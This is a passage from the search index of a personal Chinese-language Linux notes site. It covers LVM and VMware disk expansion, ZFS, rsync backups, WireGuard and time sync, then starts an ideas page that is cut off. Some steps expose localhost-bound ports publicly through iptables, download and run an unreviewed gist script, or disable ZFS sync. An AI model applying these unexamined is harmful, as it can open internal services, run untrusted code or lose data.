<li>https://askubuntu.com/questions/260620/resize-dev-loop0-and-increase-space</li> <li>https://btrfs.wiki.kernel.org/index.php/UseCases#How_do_I_resize_a_partition.3F_.28shrink.2Fgrow.29</li> </ul>"},{"location":"Linux-setup/#_17","title":"\u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8","text":"<p>\u9996\u5148\u5f53\u7136\u662f<code>sudo umount /mnt</code>\u5378\u8f7d\u6302\u8f7d\u70b9\u54af\uff0c\u5982\u4f55\u66f4\u5b89\u5168\u4e00\u70b9\u5462\uff1f</p> <pre><code>udisksctl power-off -b /dev/sdb\n</code></pre> <p>From: https://unix.stackexchange.com/questions/354138/safest-way-to-remove-usb-drive-on-linux</p>"},{"location":"Linux-setup/#iptables-127001","title":"iptables \u8ba9\u76d1\u542c\u5728127.0.0.1\u4e0a\u7684\u7aef\u53e3\u53ef\u4ee5\u516c\u7f51\u8bbf\u95ee","text":"<p>\u53c2\u8003\uff1a https://unix.stackexchange.com/questions/111433/iptables-redirect-outside-requests-to-127-0-0-1</p> <p>\u4f8b\u5982\u6709\u76d1\u542c\u5728127.0.0.1:1234\u7684\u5e94\u7528\uff0c\u73b0\u5728\u60f3\u901a\u8fc7ip:5678\u6765\u8bbf\u95ee</p> <pre><code>iptables -t nat -I PREROUTING -p tcp --dport 5678 -j DNAT --to-destination 127.0.0.1:1234\nsysctl -w net.ipv4.conf.eth0.route_localnet=1\n</code></pre>"},{"location":"Linux-setup/#vmware-lvm","title":"VMWare\u6269\u5bb9\u78c1\u76d8 LVM\u5728\u7ebf\u6269\u5bb9","text":"<p>@TAG \u865a\u62df\u673a</p> <p>\u53c2\u8003\uff1a  - https://ma.ttias.be/increase-a-vmware-disk-size-vmdk-formatted-as-linux-lvm-without-rebooting/ - https://www.cyberciti.biz/faq/howto-add-disk-to-lvm-volume-on-linux-to-increase-size-of-pool/ - https://ubuntuforums.org/showthread.php?t=2277232</p> <p>\u4fee\u590d<code>GPT PMBR size mismatch</code>\u7528<code>parted -l</code>\u8f93\u5165Fix\u5373\u53ef\uff0c\u65e0\u9700live cd</p> <pre><code>root@docker:/d# parted -l\nWarning: Not all of the space available to /dev/sda appears to be used, you can\nfix the GPT to use all of the space (an extra 314572800 blocks) or continue with\nthe current setting?\nFix/Ignore? Fix\nModel: VMware Virtual disk (scsi)\nDisk /dev/sda: 215GB\nSector size (logical/physical): 512B/512B\nPartition Table: gpt\nDisk Flags:\n\nNumber  Start   End     Size    File system  Name  Flags\n1      1049kB  2097kB  1049kB                     bios_grub\n2      2097kB  1076MB  1074MB  ext4\n3      1076MB  53.7GB  52.6GB\n\n\nModel: Linux device-mapper (linear) (dm)\nDisk /dev/mapper/ubuntu--vg-ubuntu--lv: 52.6GB\nSector size (logical/physical): 512B/512B\nPartition Table: loop\nDisk Flags:\n\nNumber  Start  End     Size    File system  Flags\n1      0.00B  52.6GB  52.6GB  ext4\n\n\nWarning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.\nModel: NECVMWar VMware SATA CD00 (scsi)\nDisk /dev/sr0: 875MB\nSector size (logical/physical): 2048B/2048B\nPartition Table: mac\nDisk Flags:\n\nNumber  Start  End    Size    File system  Name   Flags\n1      2048B  6143B  4096B                Apple\n2      659MB  662MB  2523kB               EFI\n\n\nroot@docker:/d# fdisk -l\nDisk /dev/loop0: 91 MiB, 95408128 bytes, 186344 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\n\nDisk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: C6597B3B-17F0-482A-AF5D-6056F7788052\n\nDevice       Start       End   Sectors Size Type\n/dev/sda1     2048      4095      2048   1M BIOS boot\n/dev/sda2     4096   2101247   2097152   1G Linux filesystem\n/dev/sda3  2101248 104855551 102754304  49G Linux filesystem\n\n\nDisk /dev/mapper/ubuntu--vg-ubuntu--lv: 49 GiB, 52609155072 bytes, 102752256 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nroot@docker:/d# fdisk /dev/sda\n\nWelcome to fdisk (util-linux 2.31.1).\nChanges will remain in memory only, until you decide to write them.\nBe careful before using the write command.\n\n\nCommand (m for help): n\nPartition number (4-128, default 4):\nFirst sector (104855552-419430366, default 104855552):\nLast sector, +sectors or +size{K,M,G,T,P} (104855552-419430366, default 419430366):\n\nCreated a new partition 4 of type 'Linux filesystem' and of size 150 GiB.\n\nCommand (m for help): t\nPartition number (1-4, default 4): 4\nPartition type (type L to list all types): 8e\n\nType of partition 4 is unchanged: Linux filesystem.\n\nCommand (m for help): w\nThe partition table has been altered.\nSyncing disks.\n\nroot@docker:/d# partprobe -s\n/dev/sda: gpt partitions 1 2 3 4\n/dev/mapper/ubuntu--vg-ubuntu--lv: loop partitions 1\nWarning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.\nWarning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.\nWarning: Unable to open /dev/sr0 read-write (Read-only file system).  /dev/sr0 has been opened read-only.\n/dev/sr0: mac partitions 1 2\nroot@docker:/d# fdisk -l\nDisk /dev/loop0: 91 MiB, 95408128 bytes, 186344 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\n\nDisk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: C6597B3B-17F0-482A-AF5D-6056F7788052\n\nDevice         Start       End   Sectors  Size Type\n/dev/sda1       2048      4095      2048    1M BIOS boot\n/dev/sda2       4096   2101247   2097152    1G Linux filesystem\n/dev/sda3    2101248 104855551 102754304   49G Linux filesystem\n/dev/sda4  104855552 419430366 314574815  150G Linux filesystem\n\n\nDisk /dev/mapper/ubuntu--vg-ubuntu--lv: 49 GiB, 52609155072 bytes, 102752256 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nroot@docker:/d# pvcreate /dev/sda\nsda   sda1  sda2  sda3  sda4\nroot@docker:/d# pvcreate /dev/sda4\nPhysical volume \"/dev/sda4\" successfully created.\nroot@docker:/d# vgdisplay\n--- Volume group ---\nVG Name               ubuntu-vg\nSystem ID\nFormat                lvm2\nMetadata Areas        1\nMetadata Sequence No  3\nVG Access             read/write\nVG Status             resizable\nMAX LV                0\nCur LV                1\nOpen LV               1\nMax PV                0\nCur PV                1\nAct PV                1\nVG Size               &lt;49.00 GiB\nPE Size               4.00 MiB\nTotal PE              12543\nAlloc PE / Size       12543 / &lt;49.00 GiB\nFree  PE / Size       0 / 0\nVG UUID               FJI08W-C0Db-dXmu-WPyq-Zlr9-Lejq-xadlCk\n\nroot@docker:/d# vgextend ubuntu-vg /dev/sda4\nVolume group \"ubuntu-vg\" successfully extended\nroot@docker:/d# pvscan\nPV /dev/sda3   VG ubuntu-vg       lvm2 [&lt;49.00 GiB / 0    free]\nPV /dev/sda4   VG ubuntu-vg       lvm2 [&lt;150.00 GiB / &lt;150.00 GiB free]\nTotal: 2 [198.99 GiB] / in use: 2 [198.99 GiB] / in no VG: 0 [0   ]\nroot@docker:/d# lvextend /dev/ubuntu-vg/ubuntu-lv /dev/sda4\nSize of logical volume ubuntu-vg/ubuntu-lv changed from &lt;49.00 GiB (12543 extents) to 198.99 GiB (50942 extents).\nLogical volume ubuntu-vg/ubuntu-lv successfully resized.\nroot@docker:/d# resize2fs /dev/ubuntu-vg/ubuntu-lv\nresize2fs 1.44.1 (24-Mar-2018)\nFilesystem at /dev/ubuntu-vg/ubuntu-lv is mounted on /; on-line resizing required\nold_desc_blocks = 7, new_desc_blocks = 25\nThe filesystem on /dev/ubuntu-vg/ubuntu-lv is now 52164608 (4k) blocks long.\n</code></pre> <p>resize2fs\u53ef\u4ee5\u52a0\u4e0a<code>-p</code>\u9009\u9879\u663e\u793a\u8fdb\u5ea6</p>"},{"location":"Linux-setup/#vmware","title":"VMWare\u65b0\u6dfb\u52a0\u4e00\u5757\u786c\u76d8\u6269\u5bb9\u6839\u76ee\u5f55","text":"<p>@TAG \u865a\u62df\u673a</p> <p>\u53c2\u8003\u8fd9\u4e24\u7bc7\uff1a</p> <p>https://www.cyberciti.biz/tips/vmware-add-a-new-hard-disk-without-rebooting-guest.html</p> <p>https://www.unixmen.com/add-a-new-disk-to-lvm/</p> <pre><code>root@docker3:/d# for i in /sys/class/scsi_host/*; do echo \"- - -\" &gt; ${i}/scan; done\nroot@docker3:/d# fdisk -l\nDisk /dev/sdb: 1 TiB, 1099511627776 bytes, 2147483648 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\nroot@docker3:/d# fdisk /dev/sdb\n\nWelcome to fdisk (util-linux 2.31.1).\nChanges will remain in memory only, until you decide to write them.\nBe careful before using the write command.\n\nDevice does not contain a recognized partition table.\nCreated a new DOS disklabel with disk identifier 0x3289a390.\n\nCommand (m for help): n\nPartition type\n   p   primary (0 primary, 0 extended, 4 free)\n   e   extended (container for logical partitions)\nSelect (default p):\n\nUsing default response p.\nPartition number (1-4, default 1):\nFirst sector (2048-2147483647, default 2048):\nLast sector, +sectors or +size{K,M,G,T,P} (2048-2147483647, default 2147483647):\n\nCreated a new partition 1 of type 'Linux' and of size 1024 GiB.\n\nCommand (m for help): t\nSelected partition 1\nHex code (type L to list all codes): 8e\nChanged type of partition 'Linux' to 'Linux LVM'.\n\nCommand (m for help): w\nThe partition table has been altered.\nCalling ioctl() to re-read partition table.\nSyncing disks.\n\nroot@docker3:/d# pvcreate /dev/sdb1\n  Physical volume \"/dev/sdb1\" successfully created.\nroot@docker3:/d# vgextend ubuntu-vg /dev/sdb1\n  Volume group \"ubuntu-vg\" successfully extended\nroot@docker3:/d# pvscan\n  PV /dev/sda3   VG ubuntu-vg       lvm2 [&lt;199.00 GiB / 0    free]\n  PV /dev/sdb1   VG ubuntu-vg       lvm2 [&lt;1024.00 GiB / &lt;1024.00 GiB free]\n  Total: 2 [1.19 TiB] / in use: 2 [1.19 TiB] / in no VG: 0 [0   ]\nroot@docker3:/d# lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv\n  Size of logical volume ubuntu-vg/ubuntu-lv changed from &lt;199.00 GiB (50943 extents) to 1.19 TiB (313086 extents).\n  Logical volume ubuntu-vg/ubuntu-lv successfully resized.\nroot@docker3:/d# resize2fs /dev/ubuntu-vg/ubuntu-lv\nresize2fs 1.44.1 (24-Mar-2018)\nFilesystem at /dev/ubuntu-vg/ubuntu-lv is mounted on /; on-line resizing required\nold_desc_blocks = 25, new_desc_blocks = 153\nThe filesystem on /dev/ubuntu-vg/ubuntu-lv is now 320600064 (4k) blocks long.\n\nroot@docker3:/d# df -h\n/dev/mapper/ubuntu--vg-ubuntu--lv  1.2T  170G  986G  15% /\n</code></pre>"},{"location":"Linux-setup/#vmdklvm","title":"\u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a","text":"<p>@TAG \u865a\u62df\u673a \u79bb\u7ebf\u64cd\u4f5c</p> <p>\u53c2\u8003\uff1a https://superuser.com/questions/1376690/how-to-mount-an-lvm-volume-from-a-dd-raw-vmdk-image</p> <p>\u8bd5\u8fc7\u7528windows\u76847z\u76f4\u63a5\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53ea\u80fd\u770b\u5230LVM\u6216\u8005\u591a\u4e2aimg\u6587\u4ef6\uff0c\u4e0d\u80fd\u8df3\u8fc7\u89e3\u538b\u6b65\u9aa4\uff0c\u6240\u4ee5\u8fd8\u662f\u5728linux\u4e0a\u6302\u8f7d\u5427</p> <p>\u5047\u8bbe\u6709\u4e09\u4e2avmdk\u6587\u4ef6\u9700\u8981\u6302\u8f7d\uff0c\u5f97\u5230\u7684lvm\u662f<code>/dev/ubuntu-vg/ubuntu-lv</code>\uff0c\u53ea\u8bfb\u6302\u8f7d\u5230<code>/mnt</code></p> <p>\u9700\u8981<code>apt install -y kpartx</code></p> <p>\u6302\u8f7d mount.sh:</p> <pre><code>#!/bin/bash\nkpartx -a -v disk1.vmdk\nkpartx -a -v disk2.vmdk\nkpartx -a -v disk3.vmdk\nsleep 2\npvscan\nmount  -o ro /dev/ubuntu-vg/ubuntu-lv /mnt\n</code></pre> <p>\u53d6\u6d88\u6302\u8f7d umount.sh:</p> <pre><code>#!/bin/bash\numount /mnt\nlvchange -an /dev/ubuntu-vg/ubuntu-lv\nvgchange -an /dev/ubuntu-vg\nkpartx -d disk1.vmdk\nkpartx -d disk2.vmdk\nkpartx -d disk3.vmdk\n</code></pre>"},{"location":"Linux-setup/#rclocal","title":"\u542f\u7528rc.local","text":"<p>\u53c2\u8003 https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd</p> <p>\u786e\u8ba4\u6709\u6ca1\u6709\u542f\u7528rc.local: <code>systemctl status rc-local.service</code>\u5982\u679c\u6709\u7eff\u8272\u7684<code>Active: active (exited)</code>\u51fa\u73b0\u5c31\u662f\u5df2\u7ecf\u542f\u7528</p> <pre><code>nano /etc/systemd/system/rc-local.service\nprintf '%s\\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local\nchmod +x /etc/rc.local\nsystemctl enable rc-local\n</code></pre> <pre><code>[Unit]\nDescription=/etc/rc.local Compatibility\nConditionPathExists=/etc/rc.local\n\n[Service]\nType=forking\nExecStart=/etc/rc.local start\nTimeoutSec=0\nStandardOutput=tty\nRemainAfterExit=yes\nSysVStartPriority=99\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"Linux-setup/#apttranslation","title":"apt\u7981\u7528Translation","text":"<p>apt update\u7684\u65f6\u5019\u53d1\u73b0\u4e00\u5806\u7ffb\u8bd1\u7684\u6761\u76ee\uff0c\u4e0d\u60f3\u770b\u5230\u8fd9\u4e9b</p> <p>\u521b\u5efa/etc/apt/apt.conf.d/99translations</p> <pre><code>Acquire::Languages \"none\";\n</code></pre>"},{"location":"Linux-setup/#wireguard","title":"\u5f00\u673a\u81ea\u542f\u52a8wireguard","text":"<pre><code>systemctl enable wg-quick@wg0.service\nsystemctl daemon-reload\nservice wg-quick@wg0 start\nservice wg-quick@wg0 status\n</code></pre>"},{"location":"Linux-setup/#do-release-upgrade","title":"\u4fee\u590d\u5931\u8d25\u7684do-release-upgrade","text":"<p>\u53c2\u8003\uff1a https://www.kingsware.de/2019/01/05/repair-a-damaged-package-system-after-ubuntu-dist-upgrade/</p> <p>\u53ef\u80fd\u7684\u539f\u56e0\u662f\u4f7f\u7528\u4e86ppa\u6e90\uff0c\u800c\u65b0\u7684\u53d1\u884c\u7248\u91cc\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u5df2\u7ecf\u8fdb\u5165\u5b98\u65b9\u6e90\u9020\u6210\u51b2\u7a81</p> <pre><code>apt update\napt upgrade\napt dist-upgrade\napt install -f\ndpkg --configure -a\napt autoremove\n</code></pre> <p>\u5982\u679c\u4f60\u9700\u8981\u7981\u7528ppa\u6e90\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u53bb\u5220\u9664<code>/etc/apt/sources.list.d</code>\u7684\u6587\u4ef6\uff0c\u6216\u8005\uff1a</p> <pre><code>add-apt-repository --remove ppa:PPA_REPOSITORY_NAME/PPA-NAME\n</code></pre>"},{"location":"Linux-setup/#wireguard_1","title":"\u89e3\u51b3wireguard \u5185\u6838\u6a21\u5757\u7f16\u8bd1\u5931\u8d25","text":"<p>\u62a5\u9519\u4fe1\u606f <code>error: \u2018const struct ipv6_stub\u2019 has no member named \u2018ipv6_dst_lookup_flow\u2019</code></p> <p>\u67e5\u5230\u8fd9\u4e9b\u94fe\u63a5\uff1a https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=959157</p> <p>\u5b98\u65b9\u5df2\u7ecf\u7ed9\u51fa\u4e86patch\uff1a https://git.zx2c4.com/wireguard-linux-compat/commit/?id=4602590adee92557847e61c8cd14445d35fbfa2e</p> <p>\u4f46\u662f\u6211\u5df2\u7ecf\u4ece\u6700\u65b0git\u4e0b\u8f7d\uff0c\u8fd9\u4e2apatch\u662f\u5df2\u7ecf\u6253\u4e86\u7684\uff0c\u8fd8\u662f\u540c\u6837\u7684\u62a5\u9519</p> <p>\u770bpatch\u53d1\u73b0\u8fd9\u4e2a\u6539\u52a8\u5c31\u662f\u5728\u5224\u65ad\u5185\u6838\u7248\u672c\uff0c\u5982\u679c\u7b26\u5408\u7279\u5b9a\u7248\u672c\u5c31\u5f15\u5165<code>ipv6_dst_lookup_flow</code>\u7684#define\u8bed\u53e5</p> <p>\u4f46\u4f30\u8ba1\u8fd9\u4e2a\u7248\u672c\u5224\u65ad\u662f\u4e0d\u5b8c\u5907\u7684\uff0c\u6b63\u597d\u6f0f\u6389\u4e86\u5f53\u524d\u7684\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u5f88\u7b80\u5355\uff1a\u5f3a\u884c\u628a\u8fd9\u4e2adefine\u52a0\u5165\u5373\u53ef</p> <pre><code>git clone https://git.zx2c4.com/wireguard-linux-compat\ncd wireguard-linux-compat/src\necho \"#define ipv6_dst_lookup_flow(a, b, c, d) ipv6_dst_lookup(a, b, &amp;dst, c) + (void *)0 ?: dst\" &gt;&gt; compat/compat.h\nmake\nmake install\n</code></pre>"},{"location":"Linux-setup/#luks","title":"LUKS","text":"<p>\u6559\u7a0b\uff1a https://www.cyberciti.biz/security/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/</p>"},{"location":"Linux-setup/#_18","title":"\u9a8c\u8bc1\u5bc6\u94a5\u662f\u5426\u6b63\u786e","text":"<pre><code>cryptsetup luksDump \u8bbe\u5907\ncryptsetup luksOpen --test-passphrase --key-slot 0 \u8bbe\u5907 &amp;&amp; echo ok\ncryptsetup luksOpen --test-passphrase --key-file \u5bc6\u94a5\u6587\u4ef6 --key-slot 1 \u8bbe\u5907 &amp;&amp; echo ok\n</code></pre>"},{"location":"Linux-setup/#ntp-http","title":"ntp\u7684\u66ff\u4ee3 \u4f7f\u7528http\u66f4\u65b0\u65f6\u95f4","text":"<p>\u5728ntp\u670d\u52a1\u5668\u8bbf\u95ee\u4e0d\u4e86\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528http\u534f\u8bae\u7684Date\u5b57\u6bb5\u6765\u83b7\u53d6\u65f6\u95f4</p> <p>\u53c2\u8003\uff1a https://superuser.com/questions/307158/how-to-use-ntpdate-behind-a-proxy</p> <pre><code>#!/bin/bash\ndate -s \"$(curl -i  \"http://www.google.com/\" 2&gt;/dev/null | grep -E '^[[:space:]]*[dD]ate:' | sed 's/^[[:space:]]*[dD]ate:[[:space:]]*//' | head -1l | awk '{print $1, $3, $2,  $5 ,\"GMT\", $4 }' | sed 's/,//')\"\n</code></pre>"},{"location":"Linux-setup/#rsync","title":"\u4f7f\u7528rsync\u5907\u4efd\u5168\u76d8","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>\u4e3b\u8981\u53c2\u6570\u6765\u81ea https://github.com/laurent22/rsync-time-backup</li> <li>https://ostechnix.com/backup-entire-linux-system-using-rsync/</li> <li>\u4e0d\u8981\u8de8\u8fc7mount\u8fb9\u754c\u7528<code>-xx</code> https://superuser.com/questions/626141/rsync-recursive-on-same-mount-only</li> <li>\u663e\u793a\u8fdb\u5ea6\u7528<code>--info=progress2</code> https://www.cyberciti.biz/faq/show-progress-during-file-transfer/</li> </ul> <pre><code>rsync --info=progress2 -D --numeric-ids --links --hard-links --itemize-changes --times --recursive --perms --owner --group --stats --human-readable -xx / /target/\n</code></pre> <p>\u5c0f\u6587\u4ef6\u592a\u591a\u4e0d\u5efa\u8bae\u4f7f\u7528rsync-time-backup\uff0c\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u786c\u94fe\u63a5\uff0c\u5360\u636e\u5927\u91cfbtrfs metadata\u7a7a\u95f4</p> <p>\u5907\u4efd\u8fc7\u7a0b\u4e2d\u663e\u793a\u7684\u7406\u89e3\uff1a https://unix.stackexchange.com/questions/215271/understanding-the-output-of-info-progress2-from-rsync</p> <ul> <li><code>xfr#495</code> \u8868\u793a\u5f53\u524d\u6b63\u5728\u4f20\u8f93\u7b2c495\u4e2a\u6587\u4ef6</li> <li><code>ir-chk=1020/3825</code> \u5df2\u7ecf\u77e5\u9053\u67093825\u4e2a\u6587\u4ef6\uff0c\u5176\u4e2d1020\u4e2a\u9700\u8981\u68c0\u67e5\u76ee\u6807\u4f4d\u7f6e\u7684\u6587\u4ef6\u662f\u5426\u4e00\u81f4</li> </ul>"},{"location":"Linux-setup/#_19","title":"\u8ba9\u7279\u5b9a\u8fdb\u7a0b\u8d70\u6307\u5b9a\u7f51\u5361","text":"<p>\u60f3\u505a\u5230\u7c7b\u4f3ccurl ip.sb \u2013interface tun1\u7684\u6548\u679c</p> <p>\u5982\u679c\u662f\u6709\u52a8\u6001\u94fe\u63a5libc\u53ef\u4ee5\u7528proxychains\uff08golang\u5c31\u4e0d\u80fd\u7528\uff09</p> <p>\u7b80\u5355\u7a0b\u5e8f\u4e5f\u8bb8\u80fd\u7528\u57fa\u4e8eptrace\u7684graftcp\uff08wsl\u4e0d\u80fd\u7528\uff0c\u590d\u6742\u7a0b\u5e8f\u4e5f\u4e0d\u80fd\u7528\uff09</p> <p>\u627e\u5230\u4e86cgroup\u7684\u65b9\u6848\uff0c\u786e\u5b9e\u6709\u6548\u4f46\u4ecd\u7136wsl\u4e0d\u80fd\u7528\uff1a</p> <p>\u53c2\u8003 https://serverfault.com/questions/669430/how-to-bypass-openvpn-per-application</p> <p>\u5e95\u5c42\u7528\u7684cgroup\u521b\u5efa\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u547d\u540d\u7a7a\u95f4\uff0c\u4fee\u6539route\u9ed8\u8ba4\u8def\u7531\uff0c\u8ba9\u8fdb\u7a0b\u53bb\u8fd9\u4e2a\u7a7a\u95f4\u91cc\u9762\u6267\u884c</p> <p>\u9700\u8981\u4fee\u6539\u91cc\u9762\u7684<code>real_interface</code> \u548c <code>real_interface_gateway</code></p> <p>\u51fd\u6570test_routing\u4e5f\u53ef\u4ee5\u76f4\u63a5return\uff0c\u4e0d\u9700\u8981\u68c0\u67e5</p> <pre><code>wget https://gist.githubusercontent.com/kriswebdev/a8d291936fe4299fb17d3744497b1170/raw/novpn.sh\nchmod +x novpn.sh\n#\u8bb0\u5f97\u4fee\u6539\u4ee3\u7801\n./novpn.sh curl ip.sb\n</code></pre>"},{"location":"Linux-setup/#zfs","title":"\u914d\u7f6e\u9ad8\u6027\u80fdzfs","text":"<p>\u53c2\u8003\uff1a - https://wiki.lustre.org/Optimizing_Performance_of_SSDs_and_Advanced_Format_Drives - https://github.com/allada/bsc-archive-snapshot - https://itnext.io/how-i-replaced-lvm-with-zfs-filesystem-for-my-home-nas-server-7165f620e07f - https://wiki.ubuntu.com/Kernel/Reference/ZFS</p> <pre><code>add-apt-repository ppa:jonathonf/zfs\napt install -y zfsutils-linux zfs-dkms\nzpool create -o ashift=12 tank /dev/sda\nzfs set recordsize=32K tank\nzfs set sync=disabled tank\nzfs set redundant_metadata=most tank\nzfs set atime=off tank\nzfs set logbias=throughput tank\nzfs set compression=on tank\n\nzfs create tank/project1\n</code></pre>"},{"location":"Linux-setup/#zfs_1","title":"zfs\u5feb\u7167\u4e0e\u6062\u590d","text":"<pre><code>zfs snapshot -r tank/projects@snap1\nzfs list -t snapshot\nzfs rollback mypool/projects@snap1\n</code></pre> <p>clone\u53ef\u4ee5\u5b9e\u73b0\u76f4\u63a5\u590d\u5236CoW, \u9700\u8981\u5148\u5feb\u7167:</p> <pre><code>zfs snapshot -r tank/projects@snap1\nzfs clone tank/projects@snap1 tank/projects-clone\n</code></pre> <p>\u5982\u679c\u786c\u76d8\u6302\u4e86\u7528<code>zpool scrub tank</code></p>"},{"location":"Linux-setup/#_20","title":"\u786c\u76d8\u6d4b\u8bd5","text":"<p>smart\u81ea\u68c0\uff1a</p> <pre><code>smartctl -t short /dev/sda\n#wait 2 minutes\nsmartctl -l selftest /dev/sda\n</code></pre> <p>\u8bfb\u5199\u6027\u80fd\uff1a</p> <pre><code>hdparam -Tt /dev/sda\n\napt install -y fio\nfio --randrepeat=1 --ioengine=libaio --direct=1 --gtod_reduce=1 --name=fiotest --filename=testfio --bs=4k --iodepth=64 --size=8G --readwrite=randrw --rwmixread=75 &amp;&amp; rm testfio\n</code></pre>"},{"location":"Linux-setup/#etcfstab","title":"\u9a8c\u8bc1/etc/fstab\u6b63\u786e\u6027","text":"<p>\u53c2\u8003 https://serverfault.com/questions/174181/how-do-you-validate-fstab-without-rebooting</p> <pre><code>mount -fav\nfindmnt --verify --verbose\n</code></pre>"},{"location":"Misson/","title":"\u8bf4\u660e","text":"<p>\u8fd9\u4e2a\u6587\u4ef6\u662f\u6211\u7684Idea\u4eec\uff0c\u6316\u4e2a\u5751\u5f85\u586b</p> <p>\u6709\u5174\u8da3\u548c\u6211\u4e00\u8d77\u5e72\u6216\u544a\u77e5\u73b0\u6709\u7684\u6280\u672f\uff0c\u6b22\u8fce\u63d0issue\u6216\u53d1\u9001\u90ae\u4ef6\uff1agithub@qiushi.ac.cn</p>"},{"location":"Misson/#_2","title":"\u56fe\u5e8a\u53ef\u7528\u6027\u76d1\u6d4b+\u7279\u6027\u6d4b\u8bd5\u6570\u636e\uff1f","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u6709\u5f88\u591a\u56fe\u5e8a\u670d\u52a1\uff0c\u4f46\u4f3c\u4e4e\u5e76\u6ca1\u6709\u53ef\u7528\u6027\u76d1\u6d4b\u6570\u636e\uff0c\u76f4\u63a5\u4f7f\u7528\u4e4b\u524d\u8fd8\u9700\u8981\u81ea\u884c\u6d4b\u8bd5\u662f\u5426\u6709\u9632\u76d7\u94fe\u7b49\u7279\u6027\uff0c\u6709\u6ca1\u6709\u8fd9\u6837\u4e00\u4e2a\u56fe\u5e8a\u6d4b\u8bd5\u670d\u52a1\u6765\u63d0\u4f9b\u8fd9\u4e9b\u6570\u636e\u5462\uff1f</p> <p>\u4f8b\u5982\u8fd9\u4e9b\u56fe\u5e8a\u4e0a\u4f20\u4ee3\u7801\uff1a</p> <p>https://www.npmjs.com/package/upimg/v/0.1.8 https://github.com/aimerforreimu/auxpi/tree/dev/server</p> <p>\u6bcf\u5929\u6d4b\u4e00\u6b21\u4e0a\u4f20\u670d\u52a1\u53ef\u7528\u6027\uff0c\u6bcf\u5c0f\u65f6\u6d4b\u4e00\u6b21 cdn \u4e0b\u8f7d\u53ef\u9760\u6027</p> <p>\u7279\u6027\u6307\u6807\uff1a</p> <p>\u53ef\u9760\u6027\uff1a\u4f1a\u4e0d\u4f1a 404\u3001\u670d\u52a1\u5668\u8dd1\u8def\uff08\u5982\u718a\u732b\u76f4\u64ad\u3001360 \u4e91\u76d8\uff09\u3001\u662f\u5426\u53cb\u597d\uff08\u5f15\u7528\u81ea npm upimg \u5305 0.1.8\uff1a\u7531\u4e8e\u67d0\u516c\u53f8\u65b9\u9762\u65bd\u538b\uff0cupimg \u5c06\u4e0d\u7ef4\u62a4\u4ee5\u4e0a\u5217\u8868\u5916\u670d\u52a1\u7684\u53ef\u7528\u6027\uff09</p> <p>\u6613\u7528\u6027\uff1a\u7279\u5b9a\u8bed\u8a00\u4e0b\u662f\u5426\u5df2\u7ecf\u6709\u5f00\u6e90\u4ee3\u7801\u5b9e\u73b0\u4e0a\u4f20\u529f\u80fd \uff08\u4f8b\u5982\u817e\u8baf\u4e91 cos \u524d\u7aef\u4e0a\u4f20\u5c31\u6ca1\u6709\u540e\u7aef\u8bed\u8a00\u7684\u5b9e\u73b0\uff09</p> <p>\u524d\u7aef\u53ef\u7528\uff1a\u53ef\u5426\u5728\u5176\u4ed6\u7f51\u7ad9\u4e0a\u4f20\uff0c\u662f\u5426\u9632\u76d7\u94fe\uff0c\u662f\u5426\u53ef\u4ee5\u8de8\u57df\u8bfb\u53d6\u5185\u5bb9\uff0c\u8bbf\u95ee\u9891\u7387\u9650\u5236\uff0c\u76f4\u63a5\u6253\u5f00 url \u662f\u5426\u5f3a\u5236\u4e0b\u8f7d</p> <p>\u540e\u7aef\u53ef\u7528\uff1a\u7ef4\u62a4\u767b\u5f55 cookie \u662f\u5426\u5bb9\u6613\uff08\u767b\u5f55\u9a8c\u8bc1\u7801\uff09\uff0c\u8bf7\u6c42\u9891\u7387\u9650\u5236</p> <p>\u4e0d\u6b62\u4e8e\u56fe\u7247\uff1a\u662f\u5426\u538b\u7f29\u56fe\u7247\uff0c\u662f\u5426\u53ef\u4ee5\u4e0a\u4f20\u975e\u56fe\u7247\u4e8c\u8fdb\u5236\uff0c\u5355\u4e2a\u6587\u4ef6\u6700\u5927\u5927\u5c0f</p> <p>\u5b89\u5168\uff1a\u662f\u5426\u652f\u6301\u5220\u9664\uff0c\u4f20\u8f93 